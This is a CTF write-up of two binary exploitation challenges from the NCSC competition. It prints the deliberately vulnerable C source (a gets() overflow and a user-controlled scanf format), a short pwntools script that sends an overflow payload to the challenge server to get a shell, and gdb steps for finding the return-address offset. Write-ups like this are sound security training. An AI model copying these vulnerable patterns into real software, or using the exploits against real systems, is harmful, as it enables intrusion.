# National Cyber Security Congress

NCSC, organized by Securinets, hosted an 8 hours CTF, started the 29th of January at 23:00 (GMT +1). <br/>
I've participated in the CTF with [Aziz Zribi](https://www.facebook.com/Aziz.Zribi.Z), [Zakaria Soussi](https://www.facebook.com/zakaria.soussi.12) & [Anas Chaibi](https://www.facebook.com/chanas07) as a team. We ranked the 7th out of 52 teams.

<br/>
<hr>

* ### Binary exploitation

  <ol type=1>
    <li>babypwn</li>
  <br/>
  That's a pretty basic challenge, here is the source code:
  <details>
  <summary>Show</summary>

  ```C
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  void init_buffering() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
  }
  int main(){
    int x = 0x41414141;
    char name[20];
    init_buffering(); // ignore this line
    puts("what's your name ?");
    gets(name);
    if(x != 0x41414141) {
      execve("/bin/sh", 0, 0);
    }
    return 0;
  }
  ```
  </details>
  We only need to overwrite `x` value in memory so we can just send a payload long enough to overwrite it. Here is a script for this challenge:

  <br/>
  <details>
  <summary>Show</summary>

  ```python
  from pwn import *

  # nc 52.188.108.186 1239
  conn = remote('52.188.108.186',1239)

  conn.send(b'azertyuiopqsdfghjklmwxcvbnaazzeerrttyyuuiiooppmmllkkjjhhggffddsqqwwxxccv' )

  conn.interactive()
  ```
  </details>

  And we get our shell & flag.
    <li>Freedom</li>
    <br/>
  For this challenge, we get our source code:
    <details>
  <summary>Show</summary>

  ```C
  #include<stdio.h>
  #include<stdlib.h>
  #include<string.h>
  void win(){
    execve("/bin/sh", 0, 0);
  }
  void strip(char *format) {
    format[strcspn(format, "\n")] = 0;
  }
  void init_buffering() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
  }
  int main(){
    init_buffering();
    puts("Freedom is all I want! you are free to choose your format specifier !");
    char buffer[60];
    char format[20];
    printf("> ");
    read(0, format, 20);
    strip(format);
    puts("Now, do what you want!");
    scanf(format,buffer);
    puts("good bye !");
    return 0;
  }
  ```
  </details>
That's a ret2win, we have control on the `scanf`'s format & we'll be writing into `buffer`. We start gdb to do some tests, you can find the binary [here](https://github.com/M0ngi/CTF-Writeups/blob/main/2022/NCSC/pwn/freedom). We need to get our win address.
  
  
  <p align="center">
    <img src="/2022/NCSC/img/freedomgdb.png"><br/>
  </p>
      
  Now, we need to get the length of our payload. Since we have control over the format, we'll be reading a string using `%s` & we'll use this pattern: `azertyuiopqsdfghjklmwxcvbnaazzeerrttyyuuiiooppmmllkkjjhhggffddsqqwwxxccvvbbnn`.
      
  <p align="center">
    <img src="/2022/NCSC/img/freedomgdb2.png"><br/>
  </p>
  
  And we get a segmentation fault:
  
  <p align="center">
    <img src="/2022/NCSC/img/freedomgdb3.png"><br/>
  </p>
  
  Our RIP: `0x6e6e626276 ('vbbnn')`, we now know the proper payload to change the RIP: `azertyuiopqsdfghjklmwxcvbnaazzeerrttyyuuiiooppmmllkkjjhhggffddsqqwwxxccv`
  </ol>
